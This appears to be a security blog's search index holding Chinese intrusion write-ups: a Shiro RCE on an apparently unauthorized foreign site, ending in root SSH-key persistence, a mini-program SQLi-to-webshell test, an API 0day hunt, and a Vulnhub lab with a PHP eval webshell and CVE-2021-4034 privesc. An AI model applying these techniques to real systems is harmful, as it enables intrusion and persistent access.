<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次Shiro命令执行到写入SSH公钥登陆</title>
      <link href="/posts/917134f1/"/>
      <url>/posts/917134f1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shiro命令执行(root)-内存马注入-getshell-sockes5代理-Xshell生成密钥-远程修改密钥失败-本地添加密钥-SSH公钥登陆</span><br></pre></td></tr></table></figure><h2 id="2-Shiro命令执行"><a href="#2-Shiro命令执行" class="headerlink" title="2.Shiro命令执行"></a>2.Shiro命令执行</h2><p>某国外站点，外围打点得知是Shiro框架，直接工具爆破密钥以及利用链就可-常规操作</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152329342.png" alt="image-20230218152329342"><br>默认key瞬间出来，利用链也爆破出来了，直接执行命令，root权限</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152419443.png" alt="image-20230218152419443"></p><h2 id="3-内存马注入-getshell"><a href="#3-内存马注入-getshell" class="headerlink" title="3.内存马注入-getshell"></a>3.内存马注入-getshell</h2><p>随后尝试注入内存马（冰蝎、哥斯拉等随意）</p><p>冰蝎内存马注入成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152843258.png" alt="image-20230218152843258"></p><p>随后冰蝎连接提示页面存在，密钥无法获取，换哥斯拉再试试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218152949329.png" alt="image-20230218152949329"></p><p>成功getshell</p><h2 id="4-socks5代理"><a href="#4-socks5代理" class="headerlink" title="4.socks5代理"></a>4.socks5代理</h2><p>由于目标主机远程无法直接登陆，只能进行socks5代理，随后尝试写入SSH公钥连接</p><p>由于对方是shiro框架，常见的目录如&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT不存在，索性挨个翻，尝试了不少目录但是都是302跳转</p><p>再次收集站点框架信息，找静态资源试试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153347287.png" alt="image-20230218153347287"></p><p>jquery.js框架属实太通用了，所以继续找静态资源文件中的js目录，终于……</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153526790.png" alt="image-20230218153526790"></p><p>先上传一个图片试试水，看看能不能访问</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/updog.png" alt="image-20230218153717165"></p><p>随后上传reGeorg内网渗透工具中的jsp脚本，尝试访问</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153834563.png" alt="image-20230218153834563"></p><p>随后监听：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218153939263.png" alt="image-20230218153939263"></p><h2 id="5-xshell生成用户密钥"><a href="#5-xshell生成用户密钥" class="headerlink" title="5.xshell生成用户密钥"></a>5.xshell生成用户密钥</h2><p>新建用户密钥，按照默认的就行，随后输入密码（随意设置即可，简单点……）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154042253.png" alt="image-20230218154042253"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154116843.png" alt="image-20230218154116843"></p><p>可以将生成的密钥保存到本地，也可以双击已生成的用户密钥查看公钥内容</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154154782.png" alt="image-20230218154154782"></p><h2 id="6-远程修改公钥文件"><a href="#6-远程修改公钥文件" class="headerlink" title="6.远程修改公钥文件"></a>6.远程修改公钥文件</h2><ol><li>假如authorized_keys文件不存在，尝试创建，之前遇到的网站用户貌似无权限，可能需提取到root才行，不过本系统已是root，无需提权，尝试修改authorized_keys文件<br>结果返回null…..，重新尝试修改，还是null，哥斯拉自带编辑器貌似也修改不成功<br>换一种思路，先下载到本地，将xshell生成的公钥内容复制进去（不是替换内容）<br>然后删除远程.ssh文件夹下的authorized_keys文件，随后上传修改好的authorized_keys到.ssh目录下</li></ol><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154720902.png" alt="image-20230218154720902"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218154815660.png" alt="image-20230218154815660"><br>注意文件修改时间，毕竟是国外的，有时差，所以是国外是凌晨六点钟？？？</p><h2 id="7-公钥登陆"><a href="#7-公钥登陆" class="headerlink" title="7. 公钥登陆"></a>7. 公钥登陆</h2><p>公钥已经上传，接下来是本地xshell进行socks5代理以及公钥登陆（非password登陆）</p><ol><li>远程登陆不了，只能本地ip<br> <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155107023.png" alt="image-20230218155107023"></li><li>选择公钥登陆（非password）</li></ol><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155227300.png" alt="image-20230218155227300"><br>3. xshell设置socks5代理</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155401280.png" alt="image-20230218155401280"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155438976.png" alt="image-20230218155438976"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置本地ip-选择公钥登陆-xshell设置socks5代理</span><br></pre></td></tr></table></figure><p>然后点击连接即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155621300.png" alt="image-20230218155621300"><br>输入用户名root，然后进行公钥登陆认证，密码就是刚刚xshell设置给用户密钥加密的密码</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155707126.png" alt="image-20230218155707126"></p><p>登陆成功<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155812929.png" alt="image-20230218155812929"><br>对比哥斯拉执行的命令以及ssh登陆成功执行的命令<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20230218155901107.png" alt="image-20230218155901107"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dogsaniao.jpg" alt="QQ图片20230218160935"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次微信小程序渗透测试</title>
      <link href="/posts/6608ce41/"/>
      <url>/posts/6608ce41/</url>
      
        <content type="html"><![CDATA[<h2 id="记一次微信小程序渗透测试"><a href="#记一次微信小程序渗透测试" class="headerlink" title="记一次微信小程序渗透测试"></a>记一次微信小程序渗透测试</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">信息收集-文件上传失败-SQL注入(非DBA)-小程序后台-文件上传失败-文件上传成功-GetShell</span><br></pre></td></tr></table></figure><p>工具环境：Windows10、VX客户端V3.7.5.23、Proxifier、Bp</p><h3 id="1-proxifier-bp抓取微信小程序进程包"><a href="#1-proxifier-bp抓取微信小程序进程包" class="headerlink" title="1.proxifier+bp抓取微信小程序进程包"></a>1.proxifier+bp抓取微信小程序进程包</h3><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205234756668.png" alt="image-20221205234756668"></p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域名：https://www.xxx.cn</span><br><span class="line">IP:  101.xx.xxx.8</span><br><span class="line">端口：21、22、3306、888、8888（必须宝塔）443</span><br><span class="line">小程序后台：https://www.xxx.cn/admin/auth/login.html</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>我一般测小程序主要挖密码找回、支付逻辑、短信炸弹、登陆绕过、越权等，随后找注入，上传等能拿到shell的或者其余高危漏洞。</p><h3 id="3-文件上传-失败"><a href="#3-文件上传-失败" class="headerlink" title="3.文件上传(失败)"></a>3.文件上传(失败)</h3><p>随后微信客户端打开小程序，输入手机号验证码登陆</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205234730198.png" alt="image-20221205234730198"></p><p>这个小程序逻辑也基本测完了，基于token做权限认证，貌似不存在越权什么的<br>剩下的就是个人中心（小程序中一般称我的）上传头像处进行文件上传，此处应该是做了白名单验证，上传不成功</p><p>又或者上传成功了，但是找不到上传位置(反编译小程序源代码或许会找到点思路，此处未进行此操作)</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235148942.png" alt="image-20221205235148942"></p><p>查看返回包内容：</p><p>应该是上传失败了，图片参数显示未定义</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235259085.png" alt="image-20221205235259085"></p><p>随后就找注入（商品、栏目、购物车、个人信息、搜索框等），有多个未加密的ID参数，尝试报错，时间盲注都无结果</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221206001038084.png" alt="image-20221206001038084"></p><h3 id="4-SQL注入-非DBA"><a href="#4-SQL注入-非DBA" class="headerlink" title="4.SQL注入(非DBA)"></a>4.SQL注入(非DBA)</h3><p>测完了其它功能就剩一个搜索框了（之前测得不少小程序搜索框只是摆设，并无实际搜索功能，所以最后才测试有无注入什么的）</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235025747.png" alt="image-20221205235025747"></p><p>未曾想到一发入魂，报错注入：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/baocuo.png"></p><p>熟悉TP的师傅们一眼也能看出来，不是TP就是基于TP二开的，试了试老洞也没有结果</p><p>sqlmap看看是不是DBA</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/sqlmap.png"></p><h3 id="5-小程序后台"><a href="#5-小程序后台" class="headerlink" title="5.小程序后台"></a>5.小程序后台</h3><p>很遗憾并不是，但是此时我们已经收集到了小程序的后台：<a href="https://www.xxx.cn/admin/auth/login.html">https://www.xxx.cn/admin/auth/login.html</a></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221205235654671.png" alt="image-20221205235654671"></p><p>弱口令无果，那就sqlmap跑出来管理员账号密码</p><p>直接跑出管理员账号密码看看登陆进去能不能拿到shell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/sqlmap%E8%B7%91%E5%87%BA%E5%AF%86%E7%A0%81.png"></p><p>管理员用户有好几个，密码貌似没见过这种加密方式、强用户名，猜测极有可能是弱密码了，123456做密码，进入后台。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/houtai.png"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dog.jpg"></p><h3 id="6-文件上传-失败"><a href="#6-文件上传-失败" class="headerlink" title="6.文件上传(失败)"></a>6.文件上传(失败)</h3><p>进入后台首要找上传点，个人信息处头像上传，课程编辑图片上传、都上传不了马儿</p><p>各种提示文件不支持，要么就是不解析什么的</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20221206000044981.png" alt="image-20221206000044981"></p><p>唉~</p><p> <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/xiongda.png"></p><p>随后随便点开各个功能模块，测试有无别的洞，点击其中一个模块提示无权限。</p><p>意思就是这只是其中一个管理员账号，还有别的不同权限的管理员账号</p><p>随后换账号，弱密码123456继续登陆进来</p><h3 id="7-文件上传-成功"><a href="#7-文件上传-成功" class="headerlink" title="7.文件上传(成功)"></a>7.文件上传(成功)</h3><p>是一个业务专员的账号，页面功能模块不一样了，感觉有戏</p><p>继续找上传。。。终于，ueditor编辑器，然后看到页面URL，tp的伪静态，估计也有注入，还是找上传吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/ueditor.png"></p><p>测试之后，前端绕过即可，PHP上传成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/upcg.png"></p><h3 id="8-GetShell"><a href="#8-GetShell" class="headerlink" title="8.GetShell"></a>8.GetShell</h3><p>蚁剑连接，成功getshell</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/yijianlianjie.png"></p><p>总结：前台小程序个人头像上传处上传图片失败（大概率）还是成功，可能需要裤子脱下来才能知道，算了吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/SYHD459719813012.gif"></p><p>你裤子都没脱，你凭什么？</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0day漏洞挖掘案例</title>
      <link href="/posts/a83ff7dd/"/>
      <url>/posts/a83ff7dd/</url>
      
        <content type="html"><![CDATA[<h2 id="一-思路"><a href="#一-思路" class="headerlink" title="一.思路"></a>一.思路</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过登陆（无效）-发现接口-JS审计-爆破接口-未授权访问-SQL注入</span><br></pre></td></tr></table></figure><h2 id="二-打点收集"><a href="#二-打点收集" class="headerlink" title="二.打点收集"></a>二.打点收集</h2><h3 id="1-失败的绕过登陆"><a href="#1-失败的绕过登陆" class="headerlink" title="1.失败的绕过登陆"></a>1.失败的绕过登陆</h3><p>在进行信息收集的时候，发现该系统登陆失败与成功返回的状态码，登陆成功为1000、登陆失败为1100<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210281.png"></p><p>在登陆的时候进行抓包，修改返回包的状态码为1000，此时提示登陆成功，页面跳转到后台管理首页，但是页面是空白</p><p>后边才发现直接吧login.html改成index.html也可以进入空白后台。。所以是失败的绕过登陆</p><p>刷新网页，F12看请求，查看有无接口存在：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210282.png"></p><p>尝试访问该接口，得到返回成功的一条信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210283.png"></p><p>该接口返回的是后台系统的名称等信息，无其它敏感信息，但是接口的url展示出来的路径与进入后台的路径并不一样</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未授权的后台路径：http://xxxxx.com/a-b-c/xxxx/xxx/index.html</span><br><span class="line">未授权的接口路径：http://xxxxx.com/c-d-e/xxxxx/xxxxxx/xxxxxx</span><br></pre></td></tr></table></figure><p>先将路径记下来，待会可能会用到，信息收集就是要面面俱到</p><h3 id="2-JS审计"><a href="#2-JS审计" class="headerlink" title="2.JS审计"></a>2.JS审计</h3><p>后台查看网站源代码，直接进行JS审计</p><ul><li>第一个接口暴漏：就是刚刚进入后台刷新界面得到的接口路径，注意上边提到了与未授权的后台初始路径不一样，这就是说源代码中暴漏的所有接口都可以尝试使用接口暴漏的路径进行拼接访问。</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210284.png"></p><ul><li>第二个接口暴漏：接口使用get传递，后边拼接某个参数id值</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210285.png"></p><p>使用刚刚的路径进行拼接访问：拼接的某个参数id值我赋值为0测试</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210286.png"></p><p>但是提示404，说明这个id获取不到任何数据，一种情况是0不存在，对0设置变量进行爆破，第二种情况是0参数后边可能还需要跟参数（后边也验证了这个想法，确实需要跟参数才能正确获取接口数据）</p><ul><li>第三个接口暴漏：提示接口url后边加当前用户名，继续拼接url测试访问</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210287.png"></p><p>假设当前用户名是admin，那么在暴漏的接口后边加&#x2F;admin访问，提示请求成功，但是并未返回任何有用的信息，这个时候猜测可能admin不存在，没有返回任何信息而已，直接对当前用户进行爆破</p><p>成功爆破出test用户并返回部分信息，但是并无特别敏感信息，继续找接口</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/202210289.png"></p><ul><li>第四个接口暴漏：看接口的名称像是获取系统管理设置的接口</li></ul><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102810.png"></p><p>直接访问该接口获取到了四五个路径以及一个类似管理员的账号twadmin</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102812.png"></p><h2 id="三-未授权访问x1"><a href="#三-未授权访问x1" class="headerlink" title="三.未授权访问x1"></a>三.未授权访问x1</h2><h3 id="3-柳暗花明"><a href="#3-柳暗花明" class="headerlink" title="3.柳暗花明"></a>3.柳暗花明</h3><p>刚刚爆破出一个test用户，直接把twadmin替换test获取管理员信息-返回管理员登陆系统的时间</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102811.png"></p><p>这个时候可以针对管理员密码进行爆破，既然有那么多接口，不如继续挖未授权访问，其实是因为CNVD不收web通用型弱口令（吼吼吼吼吼吼吼吼）。。。。。</p><p>刚刚还有几个html页面没有访问，直接访问看看能不能发现别的接口，访问页面报错，很正常，空壳子，又没登陆，直接查看源代码找接口吧</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102813.png"></p><ul><li>第五个接口暴漏</li></ul><p>第五个接口的url和第二个接口的url一模一样，只是后边加了一个ssxtbm参数，验证了刚刚后边加参数才能正确获取接口信息的猜想</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102814.png"></p><p>dlyhid后边不加ssxtbm参数提示404</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102815.png"></p><p>Dlyhid后边加ssxtbm参数提示请求成功，只是没有返回任何数据</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102816.png"></p><p>说明dlyhid参数是存在的，而ssxtbm参数是不存在的，所以没有返回任何信息，对ssxtbm参数进行爆破！！！</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102817.png"></p><p>发现该接口是获取后台管理系统菜单信息的接口，获取到的都是菜单信息，也不算特别敏感内容</p><p>此时获取菜单接口的url是：<a href="http://xxxxx/asas/saasas/asas/0/50000">http://xxxxx/asas/saasas/asas/0/50000</a></p><p>把0改成1试一下，同时改变后边的参数</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102818.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxx/asas/saasas/asas/1/50000</span><br><span class="line"></span><br><span class="line">http://xxxxx/asas/saasas/asas/1/30000</span><br></pre></td></tr></table></figure><p>成功返回资源地址</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102819.png"></p><p>尝试对资源地址进行访问，直接未授权访问，可以进行删除、查询、添加等操作</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102820.png"></p><p>尝试访问别的资源</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102821.png"></p><p>接口这么多……扎布夺得了</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102822.png"></p><h3 id="4-批量验证"><a href="#4-批量验证" class="headerlink" title="4.批量验证"></a>4.批量验证</h3><p>直接POST请求以及GET请求未授权接口获取信息即可</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102823.png"></p><p>吼吼吼 <img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/dog.jpg"></p><h3 id="5-end"><a href="#5-end" class="headerlink" title="5.end"></a>5.end</h3><p>到这里你以为结束了？？？</p><p>怎么可能！！！</p><p>未授权到手了，证书有了，但是一个不行啊，太少了，都未授权了，为什么不试试别的？？？</p><p>不多搞一下对不起熬那么晚的夜啊</p><h2 id="四-SQL注入x1"><a href="#四-SQL注入x1" class="headerlink" title="四.SQL注入x1"></a>四.SQL注入x1</h2><h3 id="6-出货-2"><a href="#6-出货-2" class="headerlink" title="6.出货*2"></a>6.出货*2</h3><p>刚刚测试未授权接口的时候，有个查询功能？？query？</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/20221028824.png"></p><p>直接get访问提示get请求不允许，那就post：</p><p>content-type又不对</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/cp.png"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/zd.jpg"></p><p>众多接口得知，需要改content-type为json格式</p><p>配合接口请求的数据</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102825.png"></p><p>直接用bp发送：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102826.png"></p><p>请求成功！！！</p><p>修改null为1’，继续发送，测试是否存在SQL注入</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/2022102827.png"></p><p>意思是让我们字符型加引号就好了</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture%2F2022102828.png"></p><p>SQL注入一枚，证书*2</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub之jangow打靶思路</title>
      <link href="/posts/6da7162c/"/>
      <url>/posts/6da7162c/</url>
      
        <content type="html"><![CDATA[<h1 id="一-Vulnhub之jangow打靶思路"><a href="#一-Vulnhub之jangow打靶思路" class="headerlink" title="一. Vulnhub之jangow打靶思路"></a>一. Vulnhub之jangow打靶思路</h1><h2 id="1-打靶思路总结"><a href="#1-打靶思路总结" class="headerlink" title="1.  打靶思路总结"></a>1.  打靶思路总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">信息收集-命令执行-getshell-FTP登陆-不出网反弹shell-ptyshell-SSH登陆-dirtycow提权，最终拿到root权限，获取Flag。</span><br><span class="line">* 攻击机：Kali，本机</span><br><span class="line">* 目标靶机：jangow</span><br></pre></td></tr></table></figure><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><p>靶机IP：192.168.56.118，Nmap进行端口扫描，靶机开放80以及21FTP端口，尝试FTP弱口令是否能登陆，经测试，anoymous&#x2F;anoymous弱口令不存在。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090413848.png" alt="image-20220906090413848"><br>随后访问80端口，web站点出现，PHP站点+Apache中间件。<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090652344.png" alt="image-20220906090652344"><br>尝试进行目录扫描：只发现了静态资源文件夹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906090900177.png" alt="image-20220906090900177"></p><p>尝试访问其它界面：<a href="http://192.168.56.118/site/busque.php?buscar=">http://192.168.56.118/site/busque.php?buscar=</a></p><p>bp进行不断Fuzz，命令执行漏洞X1</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091733028.png" alt="image-20220906091733028"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906091758275.png" alt="image-20220906091758275"></p><h2 id="3-一句话木马Getshell"><a href="#3-一句话木马Getshell" class="headerlink" title="3.一句话木马Getshell"></a>3.一句话木马Getshell</h2><p>既然存在命令执行，尝试使用PHP反弹shell试试，PHP反弹shell失败，怀疑不出网</p><p>查看系统有无python，使用python反弹shell，nc没反应，大概率就是不出网</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093246928.png" alt="image-20220906093246928"></p><p>随后转变思路，尝试echo一句话进去，哥斯拉生成php马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;ace&quot;]);&#x27;</span> &gt; ace.php</span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906093504511.png" alt="image-20220906093504511"></p><p>木马成功写入，使用哥斯拉连接，随后查看站点目录有无可用信息等，发现数据库连接信息，但是数据库服务未开启，但站点开启了21FTP端口，尝试此账号密码登陆失败。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094307307.png" alt="image-20220906094307307"></p><p>继续找别的敏感信息，随后再整站目录下发现另外一个数据库连接账号密码的备份文件。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094526336.png" alt="image-20220906094526336"></p><p>继续尝试用账号密码进行FTP登陆，提示登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906094945305.png" alt="image-20220906094945305"></p><p>随后cd到不同的目录中，查找文件，由于当前为www权限，进入目录很多无权限。进入到home目录下，发现关键信息</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095339610.png" alt="image-20220906095339610"></p><p>jangow01文件夹下存放了user.txt，使用FTP命令下载到本地打开</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906095505639.png" alt="image-20220906095505639"></p><p>第一个Flag已拿到：d41d8cd98f00b204e9800998ecf8427e</p><h2 id="4-反弹Shell"><a href="#4-反弹Shell" class="headerlink" title="4.反弹Shell"></a>4.反弹Shell</h2><p>哥斯拉的中有不出网反弹shell的模块：RealCmd，填好参数后，尝试进行shell反弹</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100009327.png" alt="image-20220906100009327"></p><p>本地nc监听4444即可：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100050613.png" alt="image-20220906100050613"></p><p>反弹成功，但是此时反弹回来的shell很多命令都没办法使用，比如top，vim，sudo等</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100408742.png" alt="image-20220906100408742"></p><p>如果此时目标主机存在python环境的话，我们可以尝试使用ptyshell可以实现简单的tty。</p><p>whereis python查看有无python环境，信息收集的时候我们已经得知，靶机有python3环境，于是直接运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906100745376.png" alt="image-20220906100745376"></p><p>然后就可以尝试各种命令了，再查看端口的时候，发现开放了22SSH端口：</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101132959.png" alt="image-20220906101132959"></p><p>如果可以SSH登陆进去，那就很方便了。</p><p>尝试SSH登陆，使用刚刚的FTP账号密码进行尝试。吼，登陆成功</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101345677.png" alt="image-20220906101345677"></p><h2 id="5-提权（1）"><a href="#5-提权（1）" class="headerlink" title="5.提权（1）"></a>5.提权（1）</h2><p>目前针对这台主机已经拿下webshell，FTP账号密码，SSH账号密码，但是shell权限是www，无法查看root下的文件，那就提权。</p><p>uname -a 得知是ubuntu 4.4.0，，Kali直接：searchspolit 4.4.0</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906101752814.png" alt="image-20220906101752814"></p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102009208.png" alt="image-20220906102009208"></p><p>也可直接百度搜索ubuntu 4.4.0提权等等，在此我使用的是脏牛或者CVE-2021-4034</p><p>首先查看目标主机是否安装gcc</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102738555.png" alt="image-20220906102738555"></p><p>随后上传CVE-2021-4034到&#x2F;tmp临时目录下，使用FTP上传或者哥斯拉上传都可以。</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906102915257.png" alt="image-20220906102915257"></p><p>随后进入到tmp目录下，随后编译此文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103132062.png" alt="image-20220906103132062"></p><p>编译成功后会在当前目录生成exp文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103211632.png" alt="image-20220906103211632"></p><p>随后.&#x2F;exp进行提权操作，成功提升至root权限！</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103301651.png" alt="image-20220906103301651"></p><p>进入root目录下查看文件</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103337556.png" alt="image-20220906103337556"></p><p>读取proof.txt，第二个Flag拿到</p><p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/picture/image-20220906103414524.png" alt="image-20220906103414524"></p><h2 id="6-提权（2）"><a href="#6-提权（2）" class="headerlink" 